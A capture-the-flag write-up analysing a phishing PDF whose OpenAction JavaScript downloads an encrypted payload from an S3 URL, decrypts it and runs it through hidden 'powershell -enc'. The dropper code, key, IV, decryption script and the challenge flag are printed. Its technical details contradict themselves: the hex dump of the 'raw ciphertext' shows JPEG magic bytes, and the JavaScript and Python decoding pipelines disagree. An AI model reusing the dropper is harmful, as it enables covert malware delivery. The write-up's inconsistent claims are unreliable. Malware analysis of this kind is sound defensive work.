---
title: "Is This a Rainbow?"

difficulty: Medium
description: "Our SOC team intercepted a phishing email with a PDF attachment and one of our users clicked on it. We need to analyze the PDF and figure out what the attacker was trying to do. Can you help us out?"
flag: CSC{Ang3crypt10n_1S_@wes0m3}
---

> *Our SOC team intercepted a phishing email with a PDF attachment and one of our users clicked on it. We need to analyze the PDF and figure out what the attacker was trying to do. Can you help us out?*

```
$ file challenge.pdf
challenge.pdf: PDF document, version 1.5, 1 page(s)
```

```
$ strings challenge.pdf | head -50
%PDF-1.5
1 0 obj
<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]
   /Resources << /Font << /F1 6 0 R >> >>
   /Contents 4 0 R >>
endobj
4 0 obj
<< /Length 1053 >>
stream
/F1 12 Tf
72 760 Td
14 TL
(Q4 Snapshot) Tj
() Tj
(URGENT: Your Netflix Account Has Been Compromised!) Tj
() Tj
(Dear Valued Customer,) Tj
() Tj
(We have detected unusual activity on your account originating from) Tj
(North Korea \(IP: 127.0.0.1\). Your subscription to the 'Ultra Premium) Tj
(4K HDR Dolby Atmos Family Plan' will be suspended in 24 hours unless) Tj
(you verify your identity immediately.) Tj
() Tj
(To restore access, please open the attached image in your favorite) Tj
(hex editor and chant 'sudo make me a sandwich' three times.) Tj
() Tj
(If you did not request this change, please reply to this PDF.) Tj
(Our AI-powered blockchain support team is standing by 24/7.) Tj
() Tj
(Kind regards,) Tj
(Jeff Bezos) Tj
(CEO of Netflix \(a Google company\)) Tj
() Tj
(P.S. You have also won a free iPhone 47. Click below to claim.) Tj
(P.P.S. This is totally not a virus. Trust me bro.) Tj
() Tj
(CONFIDENTIAL: This PDF will self-destruct in 5... 4... 3...) Tj
```

the visible page content is a joke phishing email. but the catalog has `/OpenAction 5 0 R` pointing to a JavaScript object. object 5 is where the real payload lives. used [Didier Stevens' pdf-parser](https://blog.didierstevens.com/programs/pdf-tools/) to pull the objects apart.

`/OpenAction 5 0 R` in the catalog (line 3 of the strings output) points to object 5, which turns out to be a `/JavaScript` action. code runs when the PDF is opened.

## the embedded JS

the JS in object 5 is ~4900 bytes. i extracted the key parts:

```javascript
var u = 'https://s3.eu-west-1.amazonaws.com/[bucket]/download.jpg';
var k = 'Lo6IKXqql3sGC3UzMwRqsQ==';
var v = 'bNUoKPHvFCX2dLxAEGZoPw==';
```

there's a full AES-128-CBC implementation in pure JavaScript (S-box, key schedule, InvShiftRows, InvSubBytes, InvMixColumns, the whole thing). then base64 helpers. the execution flow at the end:

```javascript
try {
  var rsp = Net.HTTP.request({cURL: u, cVerb: 'GET'});
  var ct = [];
  for (var i = 0; i < rsp.length; i++) ct.push(rsp.charCodeAt(i) & 255);
  var pt = dec(ct, b64d(k), b64d(v));
  var u16 = [];
  for (var i = 0; i < pt.length; i++) { u16.push(pt[i]); u16.push(0); }
  var ps = b64e(u16);
  app.launchURL('cmd:/c start /min powershell -nop -w hidden -enc ' + ps, true);
} catch(e) {}
```

so it fetches `download.jpg` from S3 (which is actually AES ciphertext with a misleading extension), decrypts it with AES-128-CBC, converts to UTF-16LE, base64 encodes it, and passes it to `powershell -enc`. that's a full downloader/dropper.

## decryption

three layers to peel. AES-128-CBC on the outside, then base64, then XOR with `0x55`:

```python
from Crypto.Cipher import AES
import base64

key = base64.b64decode("Lo6IKXqql3sGC3UzMwRqsQ==")
iv  = base64.b64decode("bNUoKPHvFCX2dLxAEGZoPw==")

with open("download.jpg", "rb") as f:
    encrypted = f.read()

cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = cipher.decrypt(encrypted)
pad_len = decrypted[-1]
decrypted = decrypted[:-pad_len]

decoded = base64.b64decode(decrypted)

plaintext = bytes([b ^ 0x55 for b in decoded])
print(plaintext.decode('utf-8', errors='ignore'))
```

note: `download.jpg` here is the file fetched from the S3 URL, not the JPEG included with the challenge. the S3 file is raw ciphertext despite the `.jpg` extension. you can see it in the hex:

```
$ xxd download.jpg | head -3
00000000: ffd8 fffe 019c 0000 0000 0000 0000 0000  ................
00000010: 1cfa a38c a12d adb1 4a18 5a92 9fb7 30d1  .....-..J.Z...0.
00000020: 0cf5 8431 be9f 22d1 57bc e06b acf4 3da2  ...1..".W..k..=.
```

the local `download.jpg` is an actual JPEG (starts with `FFD8` JFIF magic) but has encrypted data embedded in a JFIF comment marker (`FFFE`). the S3 version is the raw ciphertext blob.

after layer 2 the output still looks like garbage. the XOR with `0x55` is the last step. byte frequency analysis would give it away fast. out comes a PowerShell script with persistence, C2 comms, and the flag buried in it.

the flag was in the decrypted PowerShell script:

`CSC{Ang3crypt10n_1S_@wes0m3}`
